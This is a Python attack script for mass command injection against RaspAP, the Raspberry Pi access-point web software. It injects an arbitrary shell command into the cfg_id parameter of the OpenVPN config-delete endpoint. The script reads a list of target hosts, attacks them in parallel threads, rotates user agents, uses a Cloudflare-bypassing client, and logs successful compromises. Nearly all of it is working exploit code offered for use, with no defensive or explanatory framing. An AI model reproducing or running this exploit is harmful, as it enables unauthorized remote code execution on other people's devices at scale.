# Author: Pari Malam

import os
import random
import argparse
import requests
from colorama import Fore, init
from bs4 import BeautifulSoup
from sys import stdout
import threading
import cloudscraper

init(autoreset=True)

FG = Fore.GREEN
FR = Fore.RED
FW = Fore.WHITE
FY = Fore.YELLOW
FC = Fore.CYAN

def dirdar():
    if not os.path.exists('Results'):
        os.mkdir('Results')

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')
    
def load_user_agents():
    with open("lib/ua.txt", "r") as ua_file:
        user_agents = [ua.strip() for ua in ua_file.readlines() if ua.strip()]
    return user_agents

def banners():
    clear()
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╗  █████╗ ███████╗██████╗ ██████╗ ███████╗██████╗ ██████╗ ██╗   ██╗██████╗ ██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝██╔══██╗██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╔╝███████║███████╗██████╔╝██████╔╝█████╗  ██████╔╝██████╔╝ ╚████╔╝ ██████╔╝██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔══██╗██╔══██║╚════██║██╔═══╝ ██╔══██╗██╔══╝  ██╔══██╗██╔══██╗  ╚██╔╝  ██╔═══╝ ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██║  ██║███████║██║     ██████╔╝███████╗██║  ██║██║  ██║   ██║   ██║     ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝\n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(f"{Fore.YELLOW}[RaspberryPI] - {Fore.GREEN}Perform With Massive Command Injection In RaspberryPI Vulnerable\n")
banners()

class RASPAPExploit:
    def __init__(self, target_host, cmd):
        self.target_host = target_host
        self.target_port = 80
        self.command = ";" + cmd + ";"
        self.api_endpoint = "ajax/openvpn/del_ovpncfg.php"
        self.api_url = f"http://{self.target_host}:{self.target_port}/{self.api_endpoint}"
        self.result = "w00t.txt"
        self.headers = {'User-Agent': random.choice(load_user_agents())}
        self.scraper = cloudscraper.CloudScraper()
        
    def execute_exploit(self):
        try:
            data_to_post = {"cfg_id": self.command}
            
            responses = self.scraper.get(self.api_url, verify=False)
            
            if responses.status_code == 200:
                print(responses.text)
                
                check = self.scraper.post(self.api_url, data=data_to_post, headers=self.headers, verify=False)
                
                if check.status_code == 200:
                    print(check.text)
                    print(f"{FY}[RaspAP] - {FW}{self.target_host}:{self.target_port} - {FG}[w00t]")
                    with open(f"Results/{self.result}", "a", encoding="utf-8") as file:
                        file.write(f"{self.target_host}:{self.target_port} :-\n{responses.text}\n\n")
                elif check.status_code == 301:
                    redirects_url = check.headers['Location']
                    w00t = self.scraper.get(redirects_url)
                    
                    if w00t.status_code == 200:
                        print(w00t.text)
                        datas = {"cfg_id": self.command}
                        checks = self.scraper.post(redirects_url, data=datas, headers=self.headers, verify=False)
                        
                        if checks.status_code == 200:
                            print(checks.text)
                            print(f"{FY}[RaspAP] - {FW}{self.target_host}:{self.target_port} - {FG}[w00t]")
                            with open(f"Results/{self.result}", "a", encoding="utf-8") as file:
                                file.write(f"{self.target_host}:{self.target_port} :-\n{responses.text}\n\n")
                    else:
                        print(f"{FY}[RaspAP] - {FW}{self.target_host}:{self.target_port} - {FR}[Exploit Failed!]")
                else:
                    print(f"{FY}[RaspAP] - {FW}{self.target_host}:{self.target_port} - {FR}[Exploit Failed!]")
        except requests.exceptions.RequestException as e:
            print(f"{FY}[RaspAP] - {FW}{self.target_host}:{self.target_port} - {FR}[Connection Error]")

def main():
    parser = argparse.ArgumentParser(description="RaspberryPI Massive Command Injection")
    parser.add_argument("-f", "--file", required=True, help="File containing target hosts")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Number of concurrent threads")
    parser.add_argument("-c", "--command", required=True, help="Command to be executed")
    
    args = parser.parse_args()

    with open(args.file, "r") as file:
        target_hosts = [host.strip() for host in file.readlines()]
        exploits = []

        for host in target_hosts:
            target_host = host.strip()
            exploit_instance = RASPAPExploit(target_host, args.command)
            exploits.append(exploit_instance)

        for i in range(0, len(exploits), args.threads):
            threads = []
            for j in range(i, min(i + args.threads, len(exploits))):
                thread = threading.Thread(target=exploits[j].execute_exploit)
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

if __name__ == "__main__":
    dirdar()
    main()
